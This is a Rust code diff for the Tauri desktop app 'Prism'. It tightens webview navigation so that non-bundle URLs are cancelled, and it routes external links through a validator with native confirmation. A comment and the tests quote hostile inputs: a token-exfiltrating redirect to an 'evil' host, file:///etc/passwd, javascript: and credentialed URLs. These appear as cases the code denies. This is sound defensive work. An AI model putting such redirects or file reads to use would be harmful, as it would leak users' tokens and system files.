@@ -18,54 +18,84 @@ pub fn is_app_url(url: &Url) -> bool {
     }
 }
 
-/// Links the page may hand to the system browser / mail client.
-pub fn is_external_openable(url: &Url) -> bool {
-    matches!(url.scheme(), "https" | "http" | "mailto") && !is_app_url(url)
+/// What the webview may do with a navigation request.
+///
+/// Tauri/wry's navigation callback carries only the URL, not whether it is the
+/// main frame or a subframe, so the rule has to be safe for both: the bundle
+/// (and inert `about:` frames) load; EVERYTHING else is cancelled, silently and
+/// without side effects. In particular a navigation never opens the system
+/// browser: a `<meta refresh>` in a sandboxed website-note iframe, or
+/// `location = "https://evil/?t=" + token` from injected script, goes nowhere.
+/// Opening a link is a separate, explicit path: [`open_external_target`] plus
+/// a native confirmation (the `open_external` command).
+#[derive(Debug, PartialEq, Eq)]
+pub enum NavDecision {
+    Allow,
+    Deny,
 }
 
-fn open_externally<R: Runtime>(app: &tauri::AppHandle<R>, url: &Url) {
-    use tauri_plugin_opener::OpenerExt;
-    if is_external_openable(url) {
-        if let Err(e) = app.opener().open_url(url.as_str(), None::<&str>) {
-            log::warn!("could not open external link: {e}");
-        }
+pub fn navigation_decision(url: &Url) -> NavDecision {
+    if is_app_url(url) || url.scheme() == "about" {
+        NavDecision::Allow
+    } else {
+        NavDecision::Deny
     }
+}
+
+/// Validate a URL the page asks the shell to open in the system browser /
+/// mail client. `Some(url)` = eligible, and then still needs the user's native
+/// confirmation; `None` = refused outright (bundle URLs, `javascript:`, `file:`,
+/// custom schemes, credentials in the URL, absurd lengths).
+pub fn open_external_target(raw: &str) -> Option<Url> {
+    if raw.len() > 4096 {
+        return None;
+    }
+    let url = Url::parse(raw).ok()?;
+    match url.scheme() {
+        "https" | "http" => {
+            if url.host_str().is_none() || !url.username().is_empty() || url.password().is_some() {
+                return None;
+            }
+        }
+        "mailto" => {}
+        _ => return None,
+    }
+    if is_app_url(&url) {
+        return None;
+    }
+    Some(url)
 }
 
 pub fn create_main_window<R: Runtime>(app: &mut App<R>) -> tauri::Result<WebviewWindow<R>> {
     let state = app.state::<AppState>();
     let script = crate::host::init_script(&state.origin);
-    let handle = app.handle().clone();
-    let handle2 = app.handle().clone();
 
     #[allow(unused_mut)]
     let mut builder =
         WebviewWindowBuilder::new(app, MAIN_WINDOW, WebviewUrl::App("index.html".into()))
             .title("Prism")
             .initialization_script(script)
-            .on_navigation(move |url| {
-                // about:blank / about:srcdoc: inert frames some editors create.
-                if is_app_url(url) || url.scheme() == "about" {
-                    return true;
+            .on_navigation(|url| {
+                let d = navigation_decision(url);
+                if d == NavDecision::Deny {
+                    log::info!("blocked a {}: navigation", url.scheme());
                 }
-                // Clicked external link: hand it to the system browser, keep the app.
-                open_externally(&handle, url);
-                false
+                d == NavDecision::Allow
             });
 
     #[cfg(desktop)]
     {
         builder = builder
-            .on_new_window(move |url, _features| {
-                open_externally(&handle2, &url);
-                NewWindowResponse::Deny
-            })
+            // window.open(): the host hook routes external links through
+            // open_external; anything reaching here (subframes, other schemes)
+            // is refused with no side effect.
+            .on_new_window(|_url, _features| NewWindowResponse::Deny)
             .min_inner_size(800.0, 600.0)
             .resizable(true);
         builder = geometry::apply_saved(builder, state.settings_dir.as_deref());
     }
     #[cfg(mobile)]
-    let _ = (handle2, NewWindowResponse::<R>::Deny);
+    let _ = NewWindowResponse::<R>::Deny;
 
     builder.build()
 }
@@ -192,22 +222,50 @@ mod tests {
     }
 
     #[test]
-    fn only_the_bundled_app_is_navigable() {
-        assert!(is_app_url(&u("tauri://localhost/")));
-        assert!(is_app_url(&u("tauri://localhost/p/some-site")));
-        assert!(is_app_url(&u("http://tauri.localhost/")));
-        assert!(!is_app_url(&u("https://prism.example.com/")));
-        assert!(!is_app_url(&u("http://localhost:1940/")));
-        assert!(!is_app_url(&u("tauri://evil/")));
-        assert!(!is_app_url(&u("file:///etc/passwd")));
+    fn navigation_decisions() {
+        use NavDecision::*;
+        // The bundle loads.
+        assert_eq!(navigation_decision(&u("tauri://localhost/")), Allow);
+        assert_eq!(
+            navigation_decision(&u("tauri://localhost/p/some-site")),
+            Allow
+        );
+        assert_eq!(navigation_decision(&u("http://tauri.localhost/")), Allow);
+        assert_eq!(navigation_decision(&u("about:srcdoc")), Allow);
+        // External, whether main frame or a subframe (the callback can't tell):
+        // cancelled, never opened.
+        assert_eq!(
+            navigation_decision(&u("https://evil.example/?t=pd_x")),
+            Deny
+        );
+        assert_eq!(navigation_decision(&u("http://localhost:1940/")), Deny);
+        assert_eq!(navigation_decision(&u("mailto:someone@example.com")), Deny);
+        assert_eq!(navigation_decision(&u("tauri://evil/")), Deny);
+        assert_eq!(navigation_decision(&u("file:///etc/passwd")), Deny);
+        assert_eq!(navigation_decision(&u("javascript:alert(1)")), Deny);
     }
 
     #[test]
-    fn external_links_go_to_the_browser() {
-        assert!(is_external_openable(&u("https://example.com/a")));
-        assert!(is_external_openable(&u("mailto:someone@example.com")));
-        assert!(!is_external_openable(&u("javascript:alert(1)")));
-        assert!(!is_external_openable(&u("file:///etc/passwd")));
-        assert!(!is_external_openable(&u("tauri://localhost/")));
+    fn open_external_eligibility() {
+        // Eligible -> goes on to the native confirmation.
+        assert!(open_external_target("https://example.com/a").is_some());
+        assert!(open_external_target("http://example.com/").is_some());
+        assert!(open_external_target("mailto:someone@example.com").is_some());
+        // Refused outright.
+        for bad in [
+            "javascript:alert(1)",
+            "file:///etc/passwd",
+            "tauri://localhost/",
+            "http://tauri.localhost/",
+            "prism://auth/callback",
+            "https://user:pw@example.com/",
+            "data:text/html,hi",
+            "not a url",
+        ] {
+            assert!(open_external_target(bad).is_none(), "{bad}");
+        }
+        assert!(
+            open_external_target(&format!("https://example.com/{}", "a".repeat(5000))).is_none()
+        );
     }
 }
